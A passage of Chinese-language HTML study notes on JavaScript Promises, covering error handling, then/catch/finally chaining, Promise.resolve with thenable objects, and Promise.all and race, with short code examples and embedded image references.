background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">  throw new Error(&quot;Whoops!&quot;);</span></div><div><span style="font-size: 12pt;">}).catch(alert); // Error: Whoops!</span></div></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">在 reject() 调用的</span> <span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">error</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">  reject(new Error(&quot;Whoops!&quot;));}</span></div><div><span style="font-size: 12pt;">).catch(alert); // Error: Whoops!</span></div></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">在 </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.then/catch/finally 处理函数</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">（handler）中抛出的（throw）error</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">  resolve(&quot;ok&quot;);</span></div><div><span style="font-size: 12pt;">}).then((result) =&gt; {</span></div><div><span style="font-size: 12pt;">  throw new Error(&quot;Whoops!&quot;); // reject 这个 promise</span></div><div><span style="font-size: 12pt;">}).catch(alert); // Error: Whoops</span></div></div><div><br/></div><div><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">跟传统的 try/catch 代码块不同的是，如果没有使用 catch() 方法指定错误处理的回调函数，Promise 对象抛出的错误不会传递到外层代码，即不会影响外层代码</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">const someAsyncThing = function() {</font></div><div><font style="font-size: 12pt;">  return new Promise(function(resolve, reject) {</font></div><div><font style="font-size: 12pt;">    // 下面一行会报错，因为 x 没有声明</font></div><div><font style="font-size: 12pt;">    resolve(x + 2);</font></div><div><font style="font-size: 12pt;">  });</font></div><div><font style="font-size: 12pt;">};</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">someAsyncThing().then(function() {</font></div><div><font style="font-size: 12pt;">  console.log('everything is great');</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">setTimeout(() =&gt; { console.log(123) }, 2000);</font></div><div><font style="font-size: 12pt;">// Uncaught (in promise) ReferenceError: x is not defined</font></div><div><font style="font-size: 12pt;">// 123</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">上面代码中，someAsyncThing() 函数产生的 Promise 对象，内部有语法错误。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">浏览器运行到这一行，会打印出错误提示 ReferenceError: x is not defined，但是不会退出进程、终止脚本执行，2 秒之后还是会输出123。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">这就是说，Promise 内部的错误不会影响到 Promise 外部的代码，通俗的说法就是“Promise 会吃掉错误”。</span></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.then() 会默认最后 return 一个 promise （Promise 实例）</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">每个 .then() 分开处理时 —— 如 promise.then()、</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">promise.then()</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">，只产生一个 promise，互不影响。</span> <span style="font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(118, 0, 216); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">（即下面代码中的 promise）</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let promise = new Promise(function(resolve, reject) {</font></div><div><font style="font-size: 12pt;">  setTimeout(() =&gt; resolve(1), 1000);}</font></div><div><font style="font-size: 12pt;">);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">promise.then(function(result) {</font></div><div><font style="font-size: 12pt;">  alert(result); // 1</font></div><div><font style="font-size: 12pt;">  return result * 2;</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">promise.then(function(result) {</font></div><div><font style="font-size: 12pt;">  alert(result); // 1</font></div><div><font style="font-size: 12pt;">  return result * 2;</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">promise.then(function(result) {</font></div><div><font style="font-size: 12pt;">  alert(result); // 1</font></div><div><font style="font-size: 12pt;">  return result * 2;</font></div><div><font style="font-size: 12pt;">});</font></div></div><div><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">每个 .then() 本身执行的结果都是一个新的 promise，因此它是支持链式调用的。</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">前一个 then 方法执行的结果会作为下一个 then 方法的参数传入：</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [97].jpg" type="image/jpeg" data-filename="3.jpg" width="880"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [98].jpg" type="image/jpeg" data-filename="3.jpg" width="880"/></span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.then 链式调用</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">处理响应结果时有</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">三种返回值形式，效果是一样的</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">（不断地对参数进行处理后</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">，然后 return 传给下一个 .then，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">下一个 .then </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">可继续请求也可继续处理结果</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">）</span></div><div><br/></div><div><span style="font-size: 12pt;">成功 return 的三种形式</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-weight: bold; font-size: 12pt;">return new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt; font-weight: bold;">    resolve(res + '111')</span></div><div><span style="font-size: 12pt; font-weight: bold;">})</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">return Promise.resolve(res + '111')</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">return res + '111'</span></div></div><div><br/></div><div><span style="font-size: 12pt;">失败 return 的三种形式</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt; font-weight: bold;">return new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt; font-weight: bold;">    reject(</span><span style="font-size: 12pt; font-weight: bold;">'error message'</span><span style="font-size: 12pt; font-weight: bold;">)</span></div><div><span style="font-size: 12pt; font-weight: bold;">})</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">return Promise.reject('error message')</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">throw 'error message'</span></div></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">如果你在 then 中 使用了 return，那么 return 的值会被 Promise.resolve() 包装</span></span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="color: rgb(118, 0, 216);"><font style="font-size: 12pt;">Promise.resolve(1)</font></span></div><div><span style="color: rgb(118, 0, 216);"><font style="font-size: 12pt;">  .then(</font><span style="font-size: 12pt;">res =&gt; { </span></span></div><div><span style="font-size: 12pt;">    console.log(res) // =&gt; 1 </span></div><div><span style="font-size: 12pt;">    return 2 // 包装成 Promise.resolve(2) </span></div><div><span style="font-size: 12pt;">  }) </span></div><div><span style="font-size: 12pt;">  .then(res =&gt; { </span></div><div><span style="font-size: 12pt;">    console.log(res) // =&gt; 2 </span></div><div><span style="font-size: 12pt;">  })</span></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.then() 链式调用时 —— </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">promise</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.then().then()，产生多个 promise，一般是为了处理上一个.then() return 的结果（可多次处理）</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">如果 .then() 显式地 return 一个 Promise 实例，那么调用下一个 .then()  的 Promise 实例将变成 return 后 resolved 的 Promise 实例（</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">即下面代码中的</span> <span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">result * 2</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">）</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">new Promise(function(resolve, reject) {</font></div><div><font style="font-size: 12pt;">  setTimeout(() =&gt; resolve(1), 1000); // (*)</font></div><div><font style="font-size: 12pt;">}).then(function(result) { // (**)</font></div><div><font style="font-size: 12pt;">  alert(result); // 1</font></div><div><font style="font-size: 12pt;">  return result * 2;</font></div><div><font style="font-size: 12pt;">}).then(function(result) { // (***)</font></div><div><font style="font-size: 12pt;">  alert(result); // 2</font></div><div><font style="font-size: 12pt;">  return result * 2;</font></div><div><font style="font-size: 12pt;">}).then(function(result) {</font></div><div><font style="font-size: 12pt;">  alert(result); // 4</font></div><div><font style="font-size: 12pt;">  return result * 2;</font></div><div><font style="font-size: 12pt;">});</font></div></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.then(): 在一个 promise 被 resolved 后调用</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.catch(): 在一个 promise 被 rejected 后被调用</span></span></div><div><b style="font-size: 12pt;"><br/></b></div><div><b style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold; color: rgb(118, 0, 216);">.finally(): 不论 promise 是被 resolved 还是 rejected， 都会调用</span></b></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">.finally() 的参数是一个函数，该函数没有参数，promise 是否成功都没关系，因为 .finally() 的任务通常是执行固定的普通函数。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">  setTimeout(() =&gt; resolve(&quot;result&quot;), 2000)</span></div><div><span style="font-size: 12pt;">})</span></div><div><span style="font-size: 12pt;">  .finally(() =&gt; alert(&quot;Promise ready&quot;)) //</span> <span style="font-size: 12pt;">&lt;--  </span><span style="font-size: 12pt;">先输出 </span><span style="font-size: 12pt;">Promise ready</span></div><div><span style="font-size: 12pt;">  .then(result =&gt; alert(result));        // &lt;-- .then 对结果进行处理，再输出 </span><span style="font-size: 12pt;">result</span></div></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">  throw new Error(&quot;error&quot;);</span></div><div><span style="font-size: 12pt;">})</span></div><div><span style="font-size: 12pt;">  .finally(() =&gt; alert(&quot;Promise ready&quot;)) </span><span style="font-size: 12pt;">// &lt;--  先输出 Promise ready</span></div><div><span style="font-size: 12pt;">  .catch(err =&gt; alert(err));             // &lt;-- .catch 对 error 对象进行处理，再输出 error</span></div></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">.</span></span><span style="font-size: 12pt; font-weight: bold;">finally() </span><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">并不处理 promise 的结果</span></span><span style="font-size: 12pt; font-weight: bold;">，只负责将参数 result 或 error 的结果传递下去。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Promise 的基本结构：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">new Promise(函数1).then(函数2)</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">promise 实例对象的方法主要有三个：</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> .then()、.catch()、.finally()</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">对于一个 promise，我们可以使用它上面的 三 个方法：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">●</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> .then(): 在一个 promise 被 resolved 后调用</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">●</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> .catch(): 在一个 promise 被 rejected 后被调用</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">●</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> .finally(): 不论 promise 是被 resolved 还是 rejected 总是调用</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [99].jpg" type="image/jpeg" data-filename="3.jpg" width="493"/></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [100].jpg" type="image/jpeg" data-filename="3.jpg" width="880"/></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.then 方法</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">会接受到一个 value，这个 value 就是执行</span></span> <span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">resolve 方法时</span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">传递</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">的参数值。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [20].gif" type="image/gif" data-filename="3.gif" width="720"/></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.catch 方法也会接受到一个value，这个 value 就是执行 reject 方法时候传递的参数值。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [21].gif" type="image/gif" data-filename="3.gif" width="720"/></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise 类的方法（</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">静态方法</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">）主要有四个：.all</span></span><b style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold; color: rgb(118, 0, 216); font-family: unset;">() 、.race() 、resolve()、reject()</span></b></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [7].png" type="image/png" data-filename="3.png" width="880"/></span></span></div><div><span style="font-size: 12pt; font-weight: bold;">Promise.resolve</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">1、参数是一个 Promise 实例</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">如果参数是 Promise 实例，那么 Promise.resolve 将不做任何修改、原封不动地返回这个实例。</span></span></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">2、参数是一个 thenable 对象</span></span></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Promise.resolve 方法另一个作用就是将 thenable 对象转换为 promise 对象。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">ES6 Promises 里提到了 Thenable 这个概念，简单来说它就是一个非常类似 promise 的东西。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">就像我们有时称具有 .length 方法的非数组对象为Array like一样，thenable 指的是一个具有 .then 方法的对象。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">到底什么样的对象能算是 thenable 的呢？</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">比如下面这个对象</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let thenable = {</font></div><div><font style="font-size: 12pt;">  then: function(resolve, reject) {</font></div><div><font style="font-size: 12pt;">    resolve(42);</font></div><div><font style="font-size: 12pt;">  }</font></div><div><font style="font-size: 12pt;">};</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">最简单的例子就是 jQuery.ajax()，它的返回值就是 thenable 的。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">因为 jQuery.ajax() 的返回值是</span><span style="font-size: 12pt;">具有 .then 方法 的</span> <span style="font-size: 12pt;">jqXHR Object 对象，</span><span style="font-size: 12pt;">这个对象继承了来自 Deferred Object 的方法和属性。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">$.ajax('/json/comment.json');// =&gt; 拥有 `.then` 方法的对象</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">这个 thenable 的对象可以使用 Promise.resolve 来转换为一个promise对象，然后</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">立即执行 thenable 对象的 then 方法</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">变成了promise 对象的话，就能直接使用 then 或者 catch 等这些在 ES6 Promises 里定义的方法了。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">将 thenable 对象转换 promise 对象</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">var promise = Promise.resolve($.ajax('/json/comment.json'));// =&gt; promise对象</font></div><div><font style="font-size: 12pt;">promise.then(function(value){</font></div><div><font style="font-size: 12pt;">   console.log(value);</font></div><div><font style="font-size: 12pt;">});</font></div></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">3、参数不是具有 then 方法的对象，或根本就不是对象</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">如果参数是一个原始值，或者是一个不具有 then 方法的对象，则 Promise.resolve 方法返回一个新的 Promise 对象，状态为 resolved。</span></span></div><div><b style="font-size: 12pt;"><br/></b></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">const p = Promise.resolve('Hello');</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">p.then(function (s){</font></div><div><font style="font-size: 12pt;">  console.log(s)</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;">// Hello</font></div></div><div><b style="font-size: 12pt;"><br/></b></div><div><b style="font-size: 12pt;"><br/></b></div><div><b style="font-size: 12pt;"><br/></b></div><hr/><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">回调地狱</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [101].jpg" type="image/jpeg" data-filename="3.jpg" width="1005"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [102].jpg" type="image/jpeg" data-filename="3.jpg" width="813"/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">实例（假如此处你还不是很了解</span><span style="font-size: 12pt; font-weight: bold;">Promise</span><span style="font-size: 12pt; font-weight: bold;">，没关系，先留个印象）：</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [103].jpg" type="image/jpeg" data-filename="3.jpg" width="750"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [104].jpg" type="image/jpeg" data-filename="3.jpg" width="841"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [105].jpg" type="image/jpeg" data-filename="3.jpg" width="1076"/></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">var promise = new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">    if (true) { </span></div><div><span style="font-size: 12pt;">        resolve(100) </span></div><div><span style="font-size: 12pt;">    }</span></div><div><span style="font-size: 12pt;">    if (false) { </span></div><div><span style="font-size: 12pt;">        reject('error') </span></div><div><span style="font-size: 12pt;">    }</span></div><div><span style="font-size: 12pt;">})</span></div><div><br/></div><div><span style="font-size: 12pt;">// 使用</span></div><div><span style="font-size: 12pt;">promise.then(value =&gt; {</span></div><div><span style="font-size: 12pt;">    console.log(value);    // 100</span></div><div><span style="font-size: 12pt;">}).catch(error =&gt; {</span></div><div><span style="font-size: 12pt;">    console.error(error);</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">promise 串联（promise 链）</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [106].jpg" type="image/jpeg" data-filename="3.jpg" width="595"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [107].jpg" type="image/jpeg" data-filename="3.jpg" width="1168"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [108].jpg" type="image/jpeg" data-filename="3.jpg" width="847"/><span style="font-size: 12pt;"> </span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [109].jpg" type="image/jpeg" data-filename="3.jpg" width="699"/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">promise all 和 race</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [110].jpg" type="image/jpeg" data-filename="3.jpg" width="1130"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [111].jpg" type="image/jpeg" data-filename="3.jpg" width="841"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [112].jpg" type="image/jpeg" data-filename="3.jpg" width="705"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [113].jpg" type="image/jpeg" data-filename="3.jpg" width="848"/></div><div><br/></div><div><span style="font-size: 12pt;">race 先执行</span><span style="font-size: 12pt;">，all 后执行</span><span style="font-size: 12pt;">（race 只加载一张图片，所以更快），因为 src2 图片 width 为 100（比 src1 的 width 小），所以 race 只加载 src2</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [114].jpg" type="image/jpeg" data-filename="3.jpg" width="675"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [115].jpg" type="image/jpeg" data-filename="3.jpg" width="830"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [116].jpg" 